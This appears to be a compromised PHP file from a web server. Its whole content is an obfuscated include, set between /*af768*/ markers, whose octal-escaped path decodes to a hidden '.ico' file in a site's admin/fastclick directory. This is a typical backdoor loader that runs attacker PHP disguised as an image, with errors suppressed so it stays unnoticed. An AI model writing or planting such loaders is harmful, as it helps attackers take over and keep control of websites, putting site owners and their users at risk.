<?php
/*af768*/

@include "\057usr\057sha\162e/n\147inx\057www\057web\164ick\145t.s\157ftm\141int\056it/\162oot\057pub\154ic/\141dmi\156/fa\163tcl\151ck/\056ffa\14668e\141.ic\157";

/*af768*/




